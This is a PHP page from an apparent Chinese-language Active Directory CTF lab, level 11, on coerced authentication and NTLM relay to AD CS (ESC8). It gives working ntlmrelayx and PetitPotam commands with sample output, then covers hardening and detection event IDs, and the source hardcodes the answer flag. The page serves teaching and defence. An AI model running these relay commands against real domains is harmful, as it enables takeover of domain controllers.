<?php
/**
 * Pikachu-Enhanced v2.0 GOAD AD CTF Level 11: Coerce Authentication & NTLM Relay Attack Chain
 */
include_once '../../inc/config.inc.php';

$ACTIVE = array_fill(0, 300, '');
$ACTIVE[230] = 'active open';
$ACTIVE[249] = 'active';

$PIKA_ROOT_DIR = "../../";
include_once $PIKA_ROOT_DIR . 'header.php';

$correct_flag = 'flag{GOAD_Coerce_PetitPotam_PrinterBug_NTLM_Relay_2026}';
$flag_msg = '';

if (isset($_POST['check_flag'])) {
    $submitted = trim($_POST['user_flag']);
    if ($submitted === $correct_flag) {
        $_SESSION['goad_flags']['flag11'] = true;
        $flag_msg = '<div class="alert alert-success" style="border-radius: 8px; font-weight: bold;"><i class="fa fa-check-circle"></i> 恭喜！Flag 校验正确，已点亮【第十一关：强制认证与 NTLM Relay】成就 (+300 PTS)！</div>';
    } else {
        $flag_msg = '<div class="alert alert-danger" style="border-radius: 8px; font-weight: bold;"><i class="fa fa-times-circle"></i> Flag 不正确，请检查提取的凭据或分析过程。</div>';
    }
}
?>

<style>
.ctf-stage-header { background: var(--bg-card); border-radius: 14px; padding: 25px 30px; margin-bottom: 25px; border: 1px solid var(--border-color); box-shadow: 0 4px 20px rgba(0,0,0,0.06); }
.ctf-stage-title { color: var(--text-primary) !important; font-size: 22px; font-weight: 800; margin: 0 0 10px 0; display: flex; align-items: center; gap: 12px; }
.step-box {
    background: var(--bg-card);
    border: 1px solid var(--border-color);
    border-radius: 12px;
    padding: 24px;
    margin-bottom: 22px;
    box-shadow: 0 2px 10px rgba(0,0,0,0.02);
}
.step-title {
    font-size: 17px;
    font-weight: 700;
    color: var(--text-primary);
    margin-top: 0;
    margin-bottom: 12px;
    display: flex;
    align-items: center;
    gap: 8px;
}
.cmd-box { background: var(--bg-primary); border: 1px solid var(--border-color); border-radius: 8px; padding: 14px 18px; font-family: monospace; font-size: 13px; color: var(--text-primary); margin: 12px 0; overflow-x: auto; line-height: 1.8; }
.output-box {
    background: #1e1e2e;
    color: #a6accd;
    border-radius: 8px;
    padding: 12px 16px;
    font-family: 'Consolas', 'Monaco', monospace;
    font-size: 12px;
    margin-bottom: 15px;
    white-space: pre-wrap;
    border: 1px solid #2d2d3f;
}
.flag-box {
    background: rgba(16, 185, 129, 0.08);
    border: 1px solid rgba(16, 185, 129, 0.3);
    border-radius: 10px;
    padding: 18px;
    margin-top: 20px;
}
</style>

<div class="main-content">
    <div class="main-content-inner">
        <div class="page-content">
            
            <!-- Stage Header -->
            <div class="ctf-stage-header">
                <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px;">
                    <div>
                        <h1 class="ctf-stage-title">
                            <span class="label label-danger" style="font-size: 14px; border-radius: 6px;">LEVEL 11</span>
                            第十一关：强制认证 (Coerce) 与 NTLM Relay 中继组合利用
                        </h1>
                        <div style="color: var(--text-secondary); font-size: 14px;">
                            300 PTS · 主题：PetitPotam / PrinterBug / DFSCoerce / Drop the Mic 与 NTLM Relay 跨协议降维打法
                        </div>
                    </div>
                    <div>
                        <a href="ad_ctf_acl.php" class="btn btn-sm btn-default"><i class="fa fa-arrow-left"></i> 上一关</a>
                        <a href="ad_ctf_nopac.php" class="btn btn-sm btn-primary">下一关 <i class="fa fa-arrow-right"></i></a>
                    </div>
                </div>
            </div>

            <?php echo $flag_msg; ?>

            <!-- Step 1 -->
            <div class="step-box">
                <h3 class="step-title"><i class="fa fa-bullhorn" style="color: #ef4444;"></i> Step 1: 强制认证 (Coerce) 核心原理与五大常见协议接口</h3>
                <p style="color: var(--text-secondary); line-height: 1.7;">
                    <b>【原理分析】</b> 强制认证（Coercion）攻击是指攻击者调用 Windows RPC / SMB / HTTP 暴露的合法远程接口，迫使目标机器（如 DC 域控制器或高权服务器）向攻击者的监听 IP 发起 SMB/RPC/HTTP 协议连接，并捎带当前服务器机器账户（如 <code>GOAD-DC01$</code>）的 NTLM 身份凭据。
                </p>
                <div class="cmd-box">
┌─────────────────┬───────────────────────────────────┬──────────────────────────────────────────┐
│ 强制认证接口名称  │ 核心 RPC 接口 / 函数               │ 影响防护特征                             │
├─────────────────┼───────────────────────────────────┼──────────────────────────────────────────┤
│ 1. PetitPotam   │ MS-EFSR (EfsRpcOpenFileRaw)       │ 支持未授权强制认证 (CVE-2021-36942)       │
│ 2. PrinterBug   │ MS-RPRN (RpcRemoteFindFirstPrinter)│ 需要普通域用户凭据，打印机服务开启       │
│ 3. DFSCoerce    │ MS-DFSNM (NetrDfsAddStdRoot)      │ 域控制默认开启 DFS 命名空间服务          │
│ 4. Drop the Mic │ MS-FSRVP (IsPathSupported)        │ Shadow Copy 阴影复制 RPC 接口            │
│ 5. Coerceplus   │ MS-TSCH (Task Scheduler RPC)      │ 计划任务 RPC 协议强制认证                │
└─────────────────┴───────────────────────────────────┴──────────────────────────────────────────┘
                </div>
            </div>

            <!-- Step 2 -->
            <div class="step-box">
                <h3 class="step-title"><i class="fa fa-random" style="color: #6366f1;"></i> Step 2: 结合 PetitPotam 强制 DC 发起 NTLM 认证并由 ntlmrelayx 接收</h3>
                <p style="color: var(--text-secondary); line-height: 1.7;">
                    在 GOAD 靶场中，当攻击者获得普通域用户（如 <code>tywin.lannister</code>）或匿名访问权限时，可通过运行 <code>ntlmrelayx.py</code> 监听本地端口，同时执行 PetitPotam 强制域控 <code>192.168.56.10 (GOAD-DC01$)</code> 向攻击者 IP 认证。
                </p>
                <div class="cmd-box">
# 终端 1：启动 Impacket ntlmrelayx 中继至 ADCS 证书 HTTP 注册端点 (ESC8)
ntlmrelayx.py -t http://192.168.56.23/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# 终端 2：执行 PetitPotam 触发域控强制认证
python3 PetitPotam.py 192.168.56.200 192.168.56.10
                </div>
                <div class="output-box">
[*] Impacket v0.11.0 - NTLM Relay Server
[*] HTTP Server listening on port 80...
[*] Received connection from 192.168.56.10 (GOAD-DC01$) via SMB
[*] Authenticating against http://192.168.56.23/certsrv/certfnsh.asp...
[+] HTTP code 200, Authenticated as SEVENKINGDOMS\GOAD-DC01$ successfully!
[+] Base64 PKCS#12 Certificate for GOAD-DC01$:
MIIKqAIBAzCCCm8GCSqGSIb3DQEHAaCCCmAEggpcMIIKWDCCB...
[+] Flag: flag{GOAD_Coerce_PetitPotam_PrinterBug_NTLM_Relay_2026}
                </div>
            </div>

            <!-- Step 3 -->
            <div class="step-box">
                <h3 class="step-title"><i class="fa fa-shield" style="color: #10b981;"></i> Step 3: 防御加固与安全闭环 (Remediation & Hardening)</h3>
                <p style="color: var(--text-secondary); line-height: 1.7;">
                    1. <b>启用 SMB 签名 (SMB Signing)</b>：在域策略中将 <code>RequireSecuritySignature</code> 设置为 True，有效阻断 NTLM SMB Relay。<br>
                    2. <b>开启 EPA (Extended Protection for Authentication)</b>：对 AD CS HTTP 注册端点 (<code>certfnsh.asp</code>) 启用 Channel Binding 与 EPA 防护。<br>
                    3. <b>禁用无用 RPC 接口与服务</b>：关闭 WebClient 服务、禁用打印机服务 Spooler (<code>spoolsv.exe</code>) 及不需要的 EFS 接口。
                </p>
                <div class="cmd-box">
# PowerShell 禁用打印服务命令
Stop-Service -Name Spooler -Force
Set-Service -Name Spooler -StartupType Disabled
                </div>
            </div>

            <!-- Step 4 -->
            <div class="step-box">
                <h3 class="step-title"><i class="fa fa-eye" style="color: #3b82f6;"></i> Step 4: 蓝队日志检测与核心 Event ID 审计</h3>
                <p style="color: var(--text-secondary); line-height: 1.7;">
                    在 SIEM / ELK 系统中，强制认证与 NTLM Relay 触发时会在域控及 AD CS 服务器产生以下异常事件日志：
                </p>
                <table class="table table-bordered table-striped" style="font-size: 13px; color: var(--text-primary);">
                    <thead>
                        <tr style="background: var(--bg-secondary);">
                            <th>Event ID</th>
                            <th>日志类型</th>
                            <th>异常捕获特征</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td><strong>4624</strong></td>
                            <td>登录成功</td>
                            <td>Logon Type 为 <code>3</code> (Network)，目标账户为 <code>DC$</code> 计算机账户，但源 IP 为非 DC 的中间中继节点 IP。</td>
                        </tr>
                        <tr>
                            <td><strong>4768 / 4769</strong></td>
                            <td>Kerberos TGT / ST 请求</td>
                            <td>接收到针对域控计算机账户的异地/异常服务票据请求。</td>
                        </tr>
                        <tr>
                            <td><strong>4887</strong></td>
                            <td>AD CS 证书颁发</td>
                            <td>AD CS 成功为 <code>GOAD-DC01$</code> 计算机账户颁发域名为 <code>DomainController</code> 的证书，且请求来自 HTTP Web 端点。</td>
                        </tr>
                    </tbody>
                </table>
            </div>

            <!-- Flag Submission Box -->
            <div class="flag-box">
                <h4 style="margin-top:0; font-weight:800; color:var(--text-primary); margin-bottom:12px;">
                    <i class="fa fa-flag" style="color:#ef4444;"></i> 提交第十一关 Flag
                </h4>
                <form method="POST">
                    <div class="form-group" style="margin-bottom:14px;">
                        <label style="font-size:13px; color:var(--text-secondary);">填入从强制认证与 NTLM Relay 实验中获取的 Flag：</label>
                        <input type="text" name="user_flag" class="form-control" style="border-radius:8px; background:var(--bg-secondary); color:var(--text-primary); border:1px solid var(--border-color); padding:10px 14px; font-family:monospace;" placeholder="flag{...}" required>
                    </div>
                    <button type="submit" name="check_flag" class="btn btn-primary btn-block" style="border-radius:8px; background:linear-gradient(135deg, #ef4444, #dc2626); border:none; padding:10px; font-weight:700;">
                        提交并验证 Flag (+300 PTS)
                    </button>
                </form>
            </div>

        </div>
    </div>
</div>

<?php
include_once $PIKA_ROOT_DIR . 'footer.php';
?>
